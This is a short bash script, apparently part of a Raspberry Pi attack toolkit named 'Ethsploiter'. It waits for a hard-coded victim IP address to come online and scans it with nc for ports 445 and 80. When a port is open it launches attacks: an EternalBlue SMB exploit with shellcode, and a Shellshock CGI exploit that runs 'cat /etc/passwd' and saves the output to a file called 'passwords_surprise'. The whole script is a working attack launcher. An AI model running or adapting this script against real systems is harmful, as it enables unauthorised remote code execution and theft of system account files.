#!/bin/bash

VICTIM_ADDRESS=192.168.20.122

printf "%s" "waiting for Victim host to be up ..."
while ! ping -c 1 -n -w 1 $VICTIM_ADDRESS &> /dev/null
do
    printf "%c" "."
done
printf "\n%s\n"  "Server is back online"

returnVal=()
convertArgsStrToArray() {
    local concat=""
    local t=""
    returnVal=()

    for word in $@; do
        local len=`expr "$word" : '.*"'`

        [ "$len" -eq 1 ] && concat="true"

        if [ "$concat" ]; then
            t+=" $word"
        else
            word=${word#\"}
            word=${word%\"}
            returnVal+=("$word")
        fi

        if [ "$concat" -a "$len" -gt 1 ]; then
            t=${t# }
            t=${t#\"}
            t=${t%\"}
            returnVal+=("$t")
            t=""
            concat=""
        fi
    done
}


function checkPort {
	ARGS="${*:3}"
	convertArgsStrToArray $ARGS
	COMMAND=$2
	nc -zv $VICTIM_ADDRESS $1
	if [ $? -eq 0 ]; then
		$COMMAND "${returnVal[@]}"
	fi
}

checkPort 445 python /home/pi/Ethsploiter/exploits/windows/eternalblue/eternalblue_exploit7.py $VICTIM_ADDRESS /home/pi/Ethsploiter/exploits/windows/eternalblue/shellcode/exec_sc_all.bin &

#nc -zv 192.168.20.122 80
#if [ checkPort 80 -eq 0 ]; then
#	/home/pi/Ethsploiter/exploits/multi/shellshock/shellshock_mod_cgi_bash_exec.sh 192.168.20.122 /cgi-bin/hw.cgi "cat /etc/passwd" > /home/pi/passwords_surprise &
#ff

checkPort 80 /home/pi/Ethsploiter/exploits/multi/shellshock/shellshock_mod_cgi_bash_exec.sh $VICTIM_ADDRESS /cgi-bin/hw.cgi \"cat /etc/passwd\" > /home/pi/passwords_surprise &
